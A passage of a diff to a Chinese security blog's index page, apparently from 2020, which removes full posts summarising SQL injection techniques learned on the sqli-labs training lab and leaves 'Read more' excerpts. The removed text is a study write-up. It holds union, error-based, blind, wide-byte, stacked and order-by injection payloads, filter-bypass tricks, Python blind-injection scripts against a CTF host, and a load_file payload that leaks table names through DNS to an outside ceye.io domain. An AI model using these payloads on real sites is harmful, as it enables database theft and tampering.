-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?param&#x3D;-1&#39; union select 1,2[,3,...] %23</span><br></pre></td></tr></table></figure>
-
-<p>查数据库，表，列通过information_schema中的各个数据表来获取，注意回显位，以当前数据表一共4列，第二列数据会回显为例：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?param=-1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(schema_name) <span class="keyword">from</span> information_schema.schemata),<span class="number">3</span>,<span class="number">4</span> %<span class="number">23</span></span><br><span class="line">?param=<span class="number">-1</span><span class="string">&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&quot;XXXX&quot;),3,4 %23</span></span><br><span class="line"><span class="string">?param=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="string">&quot;XXXX&quot;</span> <span class="keyword">and</span> table_name=<span class="string">&quot;XXXXXX&quot;</span>),<span class="number">3</span>,<span class="number">4</span> %<span class="number">23</span></span><br></pre></td></tr></table></figure>
-
-<p><strong>联合查询注入适用范围：有回显，有报错</strong></p>
-<h4 id="0x04-报错注入的模板"><a href="#0x04-报错注入的模板" class="headerlink" title="0x04 报错注入的模板"></a>0x04 报错注入的模板</h4><p>报错注入主要借助特殊函数，构造特殊输入造成报错，将重要信息带到报错信息中，一般payload：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?param=1&#x27; and updatexml(1,concat(&#x27;~&#x27;,database()),1) %23</span><br></pre></td></tr></table></figure>
-
-<p>报错注入常用函数：   </p>
-<h5 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h5><p>函数原型：<code>UPDATEXML(XML_document, XPath_string, new_value);</code><br>第一个参数：<code>XML_document</code>，是String格式，是XML文档对象的名称<br>第二个参数：<code>XPath_string</code>，XPath格式的字符串<br>第三个参数：<code>new_value</code>，String格式，替换查找到符合条件的数据<br>函数作用：改变文档中符合条件的节点的值。<br>注：updatexml最多只能显示32位，需要配合substr等字符串处理函数使用。<br>例如：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;example.com&#x2F;index.php?id&#x3D;1 and updatexml(1,concat(0x7e,(select @@version),0x7e),1)</span><br></pre></td></tr></table></figure>
-
-<h5 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h5><p>函数原型：<code>EXTRACTVALUE(XML_document, XPath_string)</code><br>参数含义同上。<br>举例:   </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;example.com&#x2F;index.php?id&#x3D;1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)))</span><br></pre></td></tr></table></figure>
-
-<h5 id="几何对象"><a href="#几何对象" class="headerlink" title="几何对象"></a>几何对象</h5><p>MySQL中支持的几何数据类型包括Geometry,Point,LineString,Polygon以及集合类型的MultiPoint,MultiLineString,MultiPolygon,GeometryCollection.其中Geometry可以表示任意一种几何类型，即在MySQL中，如果一个字段类型是Geometry，则可以存储Point、LineString等其它几何类型的值。其他的几种则需要固定有效的表示格式。<br>我们可以借助几何对象的相关函数进行报错注入。<br>geometrycollection():<code>id=1 and geometrycollection((select * from(select * from(select user())a)b))</code><br>multipoint():<code>id=1 and multipoint((select * from(select * from(select user())a)b))</code><br>polygon():<code>id=1 and polygon((select * from(select * from(select user())a)b))</code><br>multipolygon():<code>id=1 and multipolygon((select * from(select * from(select user())a)b))</code><br>linestring():<code>id=1 and linestring((select * from(select * from(select user())a)b))</code><br>multilinestring():<code>id=1 and multilinestring((select * from(select * from(select user())a)b))</code>   </p>
-<h5 id="exp"><a href="#exp" class="headerlink" title="exp()"></a>exp()</h5><p>例子：<br><code>id=1 and exp(~(select * from(select user())a))</code>   </p>
-<p><strong>报错注入适用范围：无回显，但可以获得详细报错信息。</strong></p>
-<h4 id="0x05-盲注"><a href="#0x05-盲注" class="headerlink" title="0x05 盲注"></a>0x05 盲注</h4><p>盲注主要分为布尔盲注，时间盲注，其中布尔盲注通过页面报错or不报错(或者显示不同信息)来判断某一次查询结果是否为真，时间盲注通过请求响应时间来判断某一次猜解是否正确。</p>
-<p>盲注要灵活运用字符串处理函数，例如substr,left,right。</p>
-<p>通用payload：</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?param=1&#x27; and if(ascii(substr(database(),&#123;pos&#125;,1))&gt;&#123;val&#125;,1,0) %23 # 布尔，借助if函数(if被过滤可使用case when)</span><br><span class="line">?param=1&#x27; and ascii(substr(database(),&#123;pos&#125;,1)&gt;&#123;val&#125;) and sleep(3) %23 # 时间，如果第二部分为真则被短路第三部分不执行，否则执行第三部分</span><br></pre></td></tr></table></figure>
-
-<p>通过变换pos和val的值完成对某一项信息的逐位猜解。主要借助二分法来完成某一位pos的值的判断，效率较高。</p>
-<p>举一个例子，V1lu0实验室招新hard_sql，第一步爆破数据库名的脚本：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">        payload = <span class="string">&quot;?user=1&#x27; and if(ascii(substr(database(), &#123;&#125;,1))=&#123;&#125;,pow(999,999),1) %23&amp;pass=123&quot;</span>.format(i, j)</span><br><span class="line">        url = <span class="string">&quot;http://v8.su29029.xyz:10010/index.php&quot;</span> + payload</span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        <span class="comment"># print(j, end = &quot; &quot;)</span></span><br><span class="line">        <span class="keyword">if</span> (r.text.find(<span class="string">&#x27;Something wrong&#x27;</span>) != <span class="number">-1</span>):</span><br><span class="line">            print(chr(j))</span><br></pre></td></tr></table></figure>
-<p>这个脚本主要是报错盲注，题目的提示是，语句为真则登录成功，语句为假则返回失败，语句出错则返回something wrong。   </p>
-<p>这里是直接通过逐位爆破完成的盲注，二分法的脚本如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">    min=<span class="number">65</span></span><br><span class="line">    max=<span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span>(abs(max - min) &gt; <span class="number">1</span>):</span><br><span class="line">        mid = (max + min)//<span class="number">2</span></span><br><span class="line">        payload = <span class="string">&quot;?user=1&#x27; and if(ascii(substr(database(), &#123;&#125;,1))&gt;&#123;&#125;,pow(999,999),1) %23&amp;pass=123&quot;</span>.format(i, mid)</span><br><span class="line">        url = <span class="string">&quot;http://v8.su29029.xyz:10010/index.php&quot;</span> + payload</span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        <span class="comment"># print(mid, end = &quot; &quot;)</span></span><br><span class="line">        <span class="keyword">if</span> (r.text.find(<span class="string">&#x27;Something wrong&#x27;</span>) != <span class="number">-1</span>):</span><br><span class="line">            min=mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            max=mid</span><br><span class="line">res += chr(max)</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>
-
-<h4 id="0x06-宽字节注入"><a href="#0x06-宽字节注入" class="headerlink" title="0x06 宽字节注入"></a>0x06 宽字节注入</h4><p>宽字节注入主要借助GBK编码，由于mysql的识别错误(错误地将两个url编码字符识别成一个，从而吞掉原本的转义字符或特殊的防注入字符)，导致注入。</p>
-<p>通用payload：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?param=1%df&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> %<span class="number">23</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="0x07-二次注入"><a href="#0x07-二次注入" class="headerlink" title="0x07 二次注入"></a>0x07 二次注入</h4><p>二次注入主要是利用逻辑漏洞，向数据库中插入脏数据，程序运行中二次去除了脏数据缺未过滤，导致恶意sql代码被执行。常见于用户修改密码逻辑，注册逻辑等。</p>
-<h4 id="0x08-文件读写，DNSlog"><a href="#0x08-文件读写，DNSlog" class="headerlink" title="0x08 文件读写，DNSlog"></a>0x08 文件读写，DNSlog</h4><p>mysql中load_file()函数可以用于读取本地文件，into outfile 可以向本地写入文件，例如写入一句话木马。</p>
-<p>load_file()函数的一个应用是在Windows系统中通过访问由重要信息拼接而成的url，访问url需要进行dns解析，通过查看解析记录即可获取到重要信息。(具体可以参见上一篇博客sqliab学习总结（三）)。</p>
-<h4 id="0x09-过滤问题"><a href="#0x09-过滤问题" class="headerlink" title="0x09 过滤问题"></a>0x09 过滤问题</h4><p>主要绕过方法：双写绕过，任意大小写绕过，相同功能函数绕过，可代替字符绕过。</p>
-<p>1.空格，注释，引号，逗号，等号，大于号，小于号</p>
-<p>空格主要通过%a0绕过，成功率高。也可通过/**/，以及巧用括号的方式绕过</p>
-<p>避免使用注释的方法主要是巧妙闭合单引号。</p>
-<p>引号的绕过主要可以通过括号，或者单双引号逃逸的方法。</p>
-<p>逗号的绕过主要可以通过join完成，例如：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union <span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>)a <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">2</span>)b <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">3</span>)</span><br></pre></td></tr></table></figure>
-
-<p>对于某些字符串处理函数，例如substr，可以通过substr(str from pos for len)的方法以避免使用括号，limit 0,1 可以通过limit 1 offset 1代替。</p>
-<p>等号主要通过like绕过。</p>
-<p>大于号小于号主要使用greatest函数，strcmp函数，between and操作符代替。</p>
-<p>2.union select</p>
-<p>尝试两个单词之间加%0a，任意大小写，双写。</p>
-<p>3.and or</p>
-<p>and可以通过&amp;&amp;替代，or可以通过||替代。</p>
-<p>4.if</p>
-<p>使用case when代替</p>
-<p>其余关于过滤的内容见<a target="_blank" rel="noopener" href="https://github.com/su29029/su29029.github.io/blob/master/_posts/2020-7-8-sql%E6%B3%A8%E5%85%A5%E8%BF%87%E6%BB%A4%E9%97%AE%E9%A2%98.md">明天的笔记</a></p>
-
+          <p>刷完了sqlilab，今天来总结一下注入的相关内容。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/08/28/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -1779,7 +806,7 @@
               <span class="post-meta-item-text">Posted on</span>
               
 
-              <time title="Created: 2020-08-28 10:44:24 / Modified: 10:44:39" itemprop="dateCreated datePublished" datetime="2020-08-28T10:44:24+08:00">2020-08-28</time>
+              <time title="Created: 2020-08-28 10:44:24 / Modified: 13:43:32" itemprop="dateCreated datePublished" datetime="2020-08-28T10:44:24+08:00">2020-08-28</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -1806,52 +833,15 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h2 id="sqlilab做题总结（三）"><a href="#sqlilab做题总结（三）" class="headerlink" title="sqlilab做题总结（三）"></a>sqlilab做题总结（三）</h2><p>sqlilab今天正式做完一遍啦，今天最后把Less54-Less65完成。</p>
-<p>首先这部分的题比较奇怪，限制了注入次数，超过了次数，表名列名字段名都会重置，导致我们进行注入测试的时候需要严格注意每一次注入的内容，其中后面的盲注对脚本的要求也相当高。</p>
-<h5 id="Less54-57"><a href="#Less54-57" class="headerlink" title="Less54-57"></a>Less54-57</h5><p>这四个提相对简单，常规的联合查询注入，注意一下闭合方式即可。</p>
-<blockquote>
-<p>总结一下常见的一些闭合方式：</p>
-<p>1.单引号闭合<code>&#39;</code></p>
-<p>2.双引号闭合<code>&quot;</code></p>
-<p>3.单引号加括号<code>&#39;)</code>‘</p>
-<p>4.双引号加括号<code>&#39;&quot;)</code></p>
-<p>5.括号(仅限数字型注入)<code>)</code></p>
-<p>6.单引号加双括号<code>&#39;))</code></p>
-<p>7.双引号加括号<code>&quot;))</code></p>
-</blockquote>
-<p>这里以54为例注入，主要payload：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> %<span class="number">23</span>  <span class="comment"># 判断列数</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27; union <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&quot;challenges&quot;</span>),<span class="number">3</span> %<span class="number">23</span>    <span class="comment"># 表名(数据库名已知故不需要获取)</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27; union <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns) <span class="keyword">where</span> table_schema=<span class="string">&quot;challenges&quot;</span> <span class="keyword">and</span> table_name=<span class="string">&quot;XXXXX&quot;</span>),<span class="number">3</span> %<span class="number">23</span>  <span class="comment"># 列名</span></span><br></pre></td></tr></table></figure>
-
-<h5 id="Less58-61"><a href="#Less58-61" class="headerlink" title="Less58-61"></a>Less58-61</h5><p>这三个题也属于基础题，报错注入，同样注意一下闭合方式即可。payload(以58为例)：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and updatexml(1,concat(&#x27;~&#x27;,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&quot;challenges&quot;</span>)),<span class="number">1</span>) %<span class="number">23</span></span><br></pre></td></tr></table></figure>
-
-<h5 id="Less62-65"><a href="#Less62-65" class="headerlink" title="Less62-65"></a>Less62-65</h5><p>这几个题难度较高，限制130次查询，盲注出key。</p>
-<p>首先判断一下我们需要爆出的字符个数：</p>
-<blockquote>
-<p>1.数据库名，已知</p>
-<p>2.数据表名，10位</p>
-<p>3.列名，secret_XXXX，4位</p>
-<p>4.字段名，24位</p>
-<p>共计38位。</p>
-</blockquote>
-<p>相当于130次爆出38个字符，平均一个字符3-4次，传统二分法貌似无法实现。不过如果限制放宽一些的话(180-200次)的话，二分法脚本是可以完成的。</p>
-<p>如果是Windows环境，这里可以考虑借助DNS来完成注入。首先注册一个ceye.io的账号，随后ceye.io会分配一个子域名，随机分配，这里用xxxxxx代替。load_file函数除了可以读取本地文件之外，也可以对形如<code>\\www.test.com</code>的url发起请求。</p>
-<p>在Windows系统中，<code>\\</code>开头的会被识别为UNC路径。</p>
-<blockquote>
-<p>UNC是一种命名惯例, 主要用于在Microsoft Windows上指定和映射网络驱动器. UNC命名惯例最多被应用于在局域网中访问文件服务器或者打印机。我们日常常用的网络共享文件就是这个方式。</p>
-</blockquote>
-<p>相当于<code>\\\www.test.com</code>被识别成了网络地址，这里请求的时候会进行dns解析，这里我们便可以通过将我们想要查询的信息写入url中，随后查看dns解析记录(dnslog)，信息便可以获取到了。</p>
-<p>payload：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;) and if((<span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="keyword">concat</span>(<span class="string">&#x27;\\\\&#x27;</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&quot;challenges&quot;</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="string">&#x27;.xxxxxx.ceye.io\\abc&#x27;</span>))),<span class="number">1</span>,<span class="number">1</span>) %<span class="number">23</span></span><br></pre></td></tr></table></figure>
-
-<p>随后回到ceye.io查看解析记录，发现数据表名已经获得。</p>
-<p>ps1.这个方法有局限性，必须是Windows系统，且mysql具有较高权限。</p>
-<p>ps2.其他的需要盲注的题目，如果我们反复高频的发送请求，waf可能会ban掉我们的ip，这时如果我们借助这样的方式，就可以轻松的实现数据的读取了。</p>
-
+          <p>sqlilab今天正式做完一遍啦，今天最后把Less54-Less65完成。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/08/28/sqlilab%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%89%EF%BC%89/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -1895,7 +885,7 @@
               <span class="post-meta-item-text">Posted on</span>
               
 
-              <time title="Created: 2020-08-28 10:43:30 / Modified: 10:43:46" itemprop="dateCreated datePublished" datetime="2020-08-28T10:43:30+08:00">2020-08-28</time>
+              <time title="Created: 2020-08-28 10:43:30 / Modified: 13:43:28" itemprop="dateCreated datePublished" datetime="2020-08-28T10:43:30+08:00">2020-08-28</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -1922,54 +912,15 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h2 id="sqlilab做题总结（二）"><a href="#sqlilab做题总结（二）" class="headerlink" title="sqlilab做题总结（二）"></a>sqlilab做题总结（二）</h2><p>sqlilab是个值得反复做的东西，每次做都会有不同的思考。继续昨天的内容，今天的任务是Less21-Less53。</p>
-<h5 id="Less21-22"><a href="#Less21-22" class="headerlink" title="Less21-22"></a>Less21-22</h5><p>这两个题的提示是cookie注入，Less21的闭合方式是单引号加括号，Less22的闭合方式是双引号。全部采用联合查询注入即可。</p>
-<h5 id="Less23"><a href="#Less23" class="headerlink" title="Less23"></a>Less23</h5><p>Less23中注释无法使用，发现闭合方式是单引号，故可借助最后多出来的单引号在联合查询的最后一位进行闭合，payload如下：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="string">&#x27;3  # 最后一个&#x27;</span><span class="number">3</span>将结合原先<span class="keyword">sql</span>语句中存在的单引号，实现闭合。</span><br></pre></td></tr></table></figure>
-
-<p>随后就是联合查询注入，不再赘述。</p>
-<h5 id="Less24"><a href="#Less24" class="headerlink" title="Less24"></a>Less24</h5><p>Less24是二次注入。这个题首先观察页面，发现有登录，注册页面。随意注册一个账号登录上去后发现有个登录后显示信息的页面，可以修改密码，可以退出登录。题目提示二次注入，考虑修改密码的逻辑，猜测修改密码的地方没有进行转义，尝试注册<code>admin&#39; --</code>的用户，登录上去后修改密码，随后退出，使用admin用户名登录，密码为刚刚修改的密码，发现成功登录。</p>
-<p>进行白盒测试，审计代码，发现登录后修改密码的逻辑中存在漏洞，获取的用户名是从session中获取的，且没有进行转义，这时如果注册了一个包含注入代码的username，这里获取到的username就会改变update语句的结构，造成二次注入。</p>
-<h5 id="Less25-Less25a"><a href="#Less25-Less25a" class="headerlink" title="Less25/Less25a"></a>Less25/Less25a</h5><p>这两个题过滤了and和or，and可以通过&amp;&amp;绕过，or可以通过||绕过，其他的就正常操作即可。注意闭合方式。</p>
-<h5 id="Less26-26a"><a href="#Less26-26a" class="headerlink" title="Less26/26a"></a>Less26/26a</h5><p>这两个题过滤空格和注释，注释可以通过巧妙闭合单引号来避免掉注释的使用，空格的绕过方法有以下几种，可以逐一尝试：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.&#x2F;**&#x2F;绕过，&#x2F;**&#x2F;相当于空格</span><br><span class="line">2.%a0绕过，url编码时这个被正则表达式识别为中文字符，不会过滤，而mysql不能识别，不能识别的字符会变成一个空格。</span><br><span class="line">3.巧用小括号(特定情况下)</span><br></pre></td></tr></table></figure>
-
-<p>这里通过%0a绕过即可。</p>
-<h5 id="Less27-27a-28-28a"><a href="#Less27-27a-28-28a" class="headerlink" title="Less27/27a/28/28a"></a>Less27/27a/28/28a</h5><p>这四个题过滤了union select.通过试验发现，可以通过任意位大小写，双写等方法绕过。其中Less27a整体过滤了union select这个词组，这里通过%a0(union%a0select)即可绕过。(对于注释和空格的过滤可继续使用上面提到的方法绕过)。</p>
-<p>给一个这四个题全部绕过的payload(只需考虑不同的引号/括号闭合方式，以28a为例)：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27;)%a0unIOn%a0SElEct%a01,2,(&#x27;3</span><br></pre></td></tr></table></figure>
-
-<p>(关于绕过的问题可参见<a target="_blank" rel="noopener" href="https://github.com/su29029/su29029.github.io/blob/master/_posts/2020-7-8-sql%E6%B3%A8%E5%85%A5%E8%BF%87%E6%BB%A4%E9%97%AE%E9%A2%98.md">sql注入过滤问题</a>)</p>
-<h5 id="Less29-30-31"><a href="#Less29-30-31" class="headerlink" title="Less29/30/31"></a>Less29/30/31</h5><p>这两个题提示WAF，但是自己做测试的时候并没有发现在哪里过滤什么东西了…直接联合查询好像没啥问题。后来看了别人的wp，发现了这里的特殊点：根据不同的Web服务器和应用服务器特性，在遇到相同参数时，读取的参数是不一样的(但是对这个题貌似没用诶….)</p>
-<p>具体，例如<code>index.php?id=1&amp;id=2</code>,如果是apache(php)服务器，将解析最后一个id参数，如果是tomcat(jsp)服务器，则解析第一个参数，Apache(Perl(CGI))解析第一个参数，Apache(python)全部获取，返回list。</p>
-<p>这里有个问题，如果传入index.jsp?id=1&amp;id=2,那么最终返回客户端的是哪个参数呢？答案是最后一个参数，因为最终为客户端提供服务的是web服务器，也就是Apache,Apache解析最后一个参数，故返回的是id=2。</p>
-<p>这里的一个启发是，在实际的Web应用中，经常会遇到两层服务器的情况，而我们往往是在tomcat应用服务器层进行过滤，功能类似WAF。</p>
-<p>而正因为解析参数的不同，我们此处可以利用该原理绕过 WAF 的检测。如 payload：index.jsp?id=1&amp;id=0 or 1=1–+，tomcat 只检查第一个参数id=1，而对第二个参数id=0 or 1=1–+不做检查，直接传给了 apache，apache 恰好解析第二个参数，便达到了攻击的目的。</p>
-<p>(这个操作的专业叫法是：HTTP参数污染攻击)</p>
-<h5 id="Less32-33"><a href="#Less32-33" class="headerlink" title="Less32/33"></a>Less32/33</h5><p>这两个题是get型宽字节注入。宽字节注入的原理是url编码将一个精心构造好的url编码字符传入，由于后台mysql设置GBK编码，php为GBK编码，函数执行的是添加ascii码，假如我们传入<code>%df&#39;</code>,最终传入mysql的是%df%5c%27,其中%df%5c会被识别成一个宽字节，这时原本添加的\转义就被吃掉了，从而实现了注入的目的。</p>
-<p>本题payload：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%df&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">database</span>(),<span class="number">3</span> %<span class="number">23</span></span><br></pre></td></tr></table></figure>
-
-<h5 id="Less34"><a href="#Less34" class="headerlink" title="Less34"></a>Less34</h5><p>post型宽字节注入，将utf8转为utf16即可绕过。payload：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">�&#39; union select 1,database(),3#</span><br></pre></td></tr></table></figure>
-
-<h5 id="Less35"><a href="#Less35" class="headerlink" title="Less35"></a>Less35</h5><p>数字型，escape函数没用，直接注入即可。</p>
-<h5 id="Less36"><a href="#Less36" class="headerlink" title="Less36"></a>Less36</h5><p>同Less33,%df宽字节注入。</p>
-<h5 id="Less37"><a href="#Less37" class="headerlink" title="Less37"></a>Less37</h5><p>同Less34,注意一下这次只有两列即可。</p>
-<h5 id="Less38-41"><a href="#Less38-41" class="headerlink" title="Less38-41"></a>Less38-41</h5><p>堆叠注入。指的是在某些情况下，后端的sql语句执行函数可以执行多条命令(例如mysqli_multi_query())，这个时候我们可以通过;来结束前一条sql语句，随后再在分号后面写入sql，从而实现“堆一堆”sql语句进行注入。而;后的语句理论上没有过滤的话则可以为所欲为。<br>不过堆叠注入利用的条件有限，因为一般情况下后台的sql执行函数为安全起见只允许执行单一sql，分号后的语句将会被忽略。</p>
-<p>payload(注意引号闭合方式，此处以Less38为例，注意40和41需提前布尔盲注出表名):</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;<span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">users</span>(<span class="keyword">id</span>,username,<span class="keyword">password</span>) <span class="keyword">values</span> (<span class="number">100</span>,<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>); %23</span><br></pre></td></tr></table></figure>
-
-<h5 id="Less42-43-44-45"><a href="#Less42-43-44-45" class="headerlink" title="Less42/43/44/45"></a>Less42/43/44/45</h5><p>这几个题均需在passwd处进行堆叠注入。42,43有回显，44,45无回显(需在passwd字段处布尔盲注出表名)。payload:</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;<span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">users</span>(<span class="keyword">id</span>,username,<span class="keyword">password</span>) <span class="keyword">values</span> (<span class="number">100</span>,<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>); %23</span><br></pre></td></tr></table></figure>
-
-<h5 id="Less46-47-48-49"><a href="#Less46-47-48-49" class="headerlink" title="Less46/47/48/49"></a>Less46/47/48/49</h5><p>order by注入，由于不在where语句位置，故无法使用联合查询注入，这里主要采用报错注入和盲注的方式。payload: </p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Less46:sort=1 and updatexml(1,concat(&#x27;~&#x27;,database()),1) <span class="comment"># 报错注入</span></span><br><span class="line">Less47:sort=1&#x27; and if(ascii(substr(database(),1,1))=115,0,sleep (5)) %23</span><br><span class="line">Less48:sort=1 and if(ascii(substr(database(),1,1))=115,sleep(5),0) %23</span><br><span class="line">Less49:sort=1 and if(ascii(substr(database(),1,1))=115,sleep(5),0) %23</span><br></pre></td></tr></table></figure>
-
-<h5 id="Less50-51-52-53"><a href="#Less50-51-52-53" class="headerlink" title="Less50/51/52/53"></a>Less50/51/52/53</h5><p>order by+堆叠注入。payload如下：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;<span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">users</span>(<span class="keyword">id</span>,username,<span class="keyword">password</span>) <span class="keyword">values</span> (<span class="number">500</span>,<span class="string">&quot;sss&quot;</span>,<span class="string">&quot;dddd&quot;</span>);%23</span><br></pre></td></tr></table></figure>
-
-
+          <p>sqlilab是个值得反复做的东西，每次做都会有不同的思考。继续昨天的内容，今天的任务是Less21-Less53。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/08/28/sqlilab%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93%EF%BC%88%E4%BA%8C%EF%BC%89/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
